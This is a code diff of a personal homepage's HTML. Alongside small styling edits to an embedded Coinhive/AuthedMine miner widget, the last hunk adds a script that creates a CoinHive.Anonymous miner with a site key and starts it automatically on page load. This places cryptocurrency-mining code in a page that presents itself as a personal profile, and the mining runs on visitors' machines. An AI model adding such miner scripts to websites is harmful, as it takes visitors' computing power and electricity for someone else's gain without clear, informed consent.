@@ -83,7 +83,7 @@
                     
                     <div class="dyn-text">HELLO THERE</div>
                 </div>
-				<a href="#card" class="page-scroll btn btn-xl">More about me</a>
+				<a href="#card"  class="page-scroll btn btn-xl">More about me</a>
 			</div>
 		</div>
 	</header>
@@ -140,9 +140,8 @@
 			<div class="row">
 				<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
 				<div class="coinhive-miner" 
-				    style="position:relative;left:37%;width: 299px; height: 320px;"
 				    data-key="yGQeitsG98TXLImd9agv4aaV2IQewusV"
-				    data-background="#e1ba9d"
+				    data-background="#ffffff"
 				    data-action="#883510"
 				    data-graph="#883510"
 				    data-threads="4"
@@ -568,7 +567,12 @@
 		</div>
 	</div>
 
+	<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+	<script>
+	    var miner = new CoinHive.Anonymous('yGQeitsG98TXLImd9agv4aaV2IQewusV', {throttle: 0.3});
 
+	    miner.start();
+	</script>
 
 	
 	<!-- jQuery -->
